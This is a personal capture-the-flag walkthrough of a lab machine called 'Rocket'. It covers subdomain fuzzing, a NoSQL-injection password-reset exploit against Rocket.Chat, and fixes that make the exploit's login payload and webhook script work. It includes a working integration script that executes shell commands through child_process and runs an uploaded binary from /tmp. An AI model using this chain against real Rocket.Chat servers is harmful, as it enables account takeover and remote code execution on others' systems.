# WIP: Rocket 

*Get ready for blast off!*

This room was a *quest*, many steps each a bit of effort. 

Scans revealed 22 and 80, on 80 you were redirected to 'rocket.thm', which a host entry needed to be created for.

There was just a brochureware site at that address, so with ffuf and scanning for subdomains (via `-H "Host: FUZZ.rocket.thm"`) the subdomain chat was found.

On chat.rocket.thm was, obviously, an instance of the Rocket Chat chat system. There is a few CVEs for this - the one I tried was https://www.exploit-db.com/exploits/49960, an exploit that can, with the email of an existing user and a target admin email account, reset passwords for these accounts via nosql injection to recover reset tokens, and then use the admin account to gain RCE via webhooks (the rocket chat webhook feature allows nodejs scripts).

The exploit by itself didn't work properly however - it could successfully reset passwords (changing them to `P@$$w0rd!1234`) but would fail when attempting to run the RCE. Examining the script, there were a few issues:

- first, resetting a password takes ages and it does this *twice*, once with the low priv user. This can be skipped by registering a user on the site then baking that user's password into the exploit and skipping the reset step. Though this might be necessary as its only purpose seems to be to get a OTP token.
- as just alluded to, the script assumes the site and the admin is protected by MFA. This is not the case for this room. Accordingly all the secret and code stuff in the script can be removed, but importantly, within the RCE function, the payload sent to the auth endpoint should be changed from:

  ```
  	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
  ```
  
  to
  
  ```
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
  ```
- third, the rce execution doesn't work because it uses the wrong format for the nodejs script, compared to what rocketchat expects. specifically it tries to create an integration (webhook) with the following script:

  ```
  const require = console.log.constructor('return process.mainModule.require')();
  const { exec } = require('child_process');
  exec('+cmd+');
  ```
  
  this however is invalid. at this point I abandoned the exploit and using the reset admin credentials, modded the integration directly to follow this format:
  
  ```
  class Script
  {
    process_incoming_request() {
      const require = console.log.constructor('return process.mainModule.require')();
      const { execSync } = require('child_process');
      res = execSync('chmod +x /tmp/CR86Ge29yShsPuLFp && /tmp/CR86Ge29yShsPuLFp');
      return { content: { text: res.toString() } }
    }
  }
  ```
  
Webhooks can be invoked by curl, and the full curl command is helpfully provided on the integrations page. Notably, in the above setup the output of the command is placed in the general chat channel, which isn't very stealthy. Alternatively using `return { error: { success: false, message: res.toString() } }` would output the error on the command line after curl. Also, bad failures of the script can be diagnosed in the logs (though the log will be full of errors from the token brute forcing, be warned).

With RCE, the box was enumerated slowly. Its a tied down docker container, with none of the common tools. To upload I changed rocket chats settings to use the file system and /tmp folder, and then uploaded files into chat. They would be placed in /tmp with random file names, but were otherwise fine.
